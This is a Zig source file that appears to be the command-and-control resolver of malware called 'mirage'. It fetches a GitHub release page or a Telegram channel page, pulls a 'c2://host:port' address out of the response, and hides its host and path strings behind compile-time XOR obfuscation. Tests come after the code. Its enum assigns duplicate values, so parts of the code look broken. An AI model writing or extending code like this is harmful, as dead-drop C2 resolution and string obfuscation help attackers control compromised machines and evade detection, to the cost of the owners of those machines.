const std = @import("std");
const http = @import("http.zig");
const hash = @import("../types/hash.zig");

const encrypted_github_api = comptime hash.xorEncrypt("api.github.com");
const encrypted_github_releases = comptime hash.xorEncrypt("/repos/{s}/{s}/releases/latest");
const encrypted_telegram_host = comptime hash.xorEncrypt("t.me");
const encrypted_telegram_path = comptime hash.xorEncrypt("/s/{s}");

pub const ProxyLevel = enum(u32) {
    telegram = 1,
    ton = 1,
    steam = 1,
    github = 2,
    vps = 3,
};

pub const ProxyResult = struct {
    c2_host: []const u8,
    c2_port: u16,
    level: ProxyLevel,
};

fn decryptStr(comptime encrypted: *const [_:0]u8, buf: []u8) []u8 {
    const len = std.mem.sliceTo(encrypted, 0).len;
    hash.xorDecrypt(encrypted[0..len], buf[0..len]);
    return buf[0..len];
}

fn parseC2FromResponse(body: []const u8, allocator: std.mem.Allocator) ?[]const u8 {
    const prefix = "c2://";
    const start = std.mem.indexOf(u8, body, prefix) orelse return null;
    const value_start = start + prefix.len;
    const remaining = body[value_start..];
    if (remaining.len == 0) return null;
    const max_c2_len = @min(remaining.len, 256);
    const end = std.mem.indexOfAny(u8, remaining[0..max_c2_len], &[_]u8{ '\r', '\n', ' ', '<', '\t', '"', '\'' }) orelse max_c2_len;
    if (end == 0) return null;
    return allocator.dupe(u8, remaining[0..end]) catch null;
}

fn parseC2Address(c2_str: []const u8, allocator: std.mem.Allocator) ?ProxyResult {
    const colon = std.mem.indexOfScalar(u8, c2_str, ':') orelse return null;
    const host_slice = c2_str[0..colon];
    if (host_slice.len == 0 or host_slice.len > 255) return null;
    for (host_slice) |c| {
        if (c == 0) return null;
    }
    const port = std.fmt.parseInt(u16, c2_str[colon + 1 ..], 10) catch return null;
    if (port == 0) return null;

    const host = allocator.dupe(u8, host_slice) catch return null;
    return ProxyResult{
        .c2_host = host,
        .c2_port = port,
        .level = .github,
    };
}

pub fn resolve(allocator: std.mem.Allocator, channel: ProxyLevel) ?ProxyResult {
    switch (channel) {
        .github => {
            var gh_host_buf: [64]u8 = undefined;
            const gh_host = decryptStr(&encrypted_github_api, &gh_host_buf);

            var gh_path_buf: [256]u8 = undefined;
            hash.xorDecrypt(&encrypted_github_releases, &gh_path_buf);
            const gh_path_tpl = gh_path_buf[0..encrypted_github_releases.len];

            const user = "mirage";
            const repo = "c2";
            var path_buf: [256]u8 = undefined;
            const path = std.fmt.bufPrint(&path_buf, gh_path_tpl, .{ user, repo }) catch return null;

            var client = http.HttpClient.connect(gh_host, 443) catch return null;
            defer client.close();

            const resp = client.get(path, &.{}) catch return null;
            defer resp.deinit();

            if (resp.status != 200) return null;

            const c2_str = parseC2FromResponse(resp.body, allocator) orelse return null;
            defer allocator.free(c2_str);

            var result = parseC2Address(c2_str, allocator) orelse return null;
            result.level = .github;
            return result;
        },
        .telegram => {
            var tg_host_buf: [16]u8 = undefined;
            const tg_host = decryptStr(&encrypted_telegram_host, &tg_host_buf);

            var tg_path_buf: [128]u8 = undefined;
            hash.xorDecrypt(&encrypted_telegram_path, &tg_path_buf);
            const tg_path_tpl = tg_path_buf[0..encrypted_telegram_path.len];

            const channel_name = "mirage_c2";
            var path_buf: [128]u8 = undefined;
            const path = std.fmt.bufPrint(&path_buf, tg_path_tpl, .{channel_name}) catch return null;

            var client = http.HttpClient.connect(tg_host, 443) catch return null;
            defer client.close();

            const resp = client.get(path, &.{}) catch return null;
            defer resp.deinit();

            if (resp.status != 200) return null;

            const c2_str = parseC2FromResponse(resp.body, allocator) orelse return null;
            defer allocator.free(c2_str);

            var result = parseC2Address(c2_str, allocator) orelse return null;
            result.level = .telegram;
            return result;
        },
        .ton, .steam, .vps => {
            return null;
        },
    }
}

test "proxy resolve github returns null without config" {
    const allocator = std.testing.allocator;
    const result = resolve(allocator, .github);
    if (result) |r| {
        defer allocator.free(r.c2_host);
        try std.testing.expect(r.c2_port > 0);
        try std.testing.expect(r.c2_host.len > 0);
    } else {
        try std.testing.expect(result == null);
    }
}

test "proxy resolve telegram returns null without config" {
    const allocator = std.testing.allocator;
    const result = resolve(allocator, .telegram);
    try std.testing.expect(result == null);
}

test "proxy resolve unsupported levels return null" {
    const allocator = std.testing.allocator;
    try std.testing.expect(resolve(allocator, .ton) == null);
    try std.testing.expect(resolve(allocator, .steam) == null);
    try std.testing.expect(resolve(allocator, .vps) == null);
}

test "proxy parse c2 from response" {
    const allocator = std.testing.allocator;
    const body = "some html with c2://192.168.1.1:8080 in it";
    const result = parseC2FromResponse(body, allocator);
    defer if (result) |r| allocator.free(r);
    try std.testing.expect(result != null);
    if (result) |r| {
        try std.testing.expectEqualStrings("192.168.1.1:8080", r);
    }
}

test "proxy parse c2 not found" {
    const allocator = std.testing.allocator;
    const result = parseC2FromResponse("no c2 prefix here", allocator);
    try std.testing.expect(result == null);
}

test "proxy result struct size" {
    try std.testing.expect(@sizeOf(ProxyResult) > 0);
}

test "proxy level enum values" {
    try std.testing.expect(@intFromEnum(ProxyLevel.telegram) == 1);
    try std.testing.expect(@intFromEnum(ProxyLevel.github) == 2);
    try std.testing.expect(@intFromEnum(ProxyLevel.vps) == 3);
}
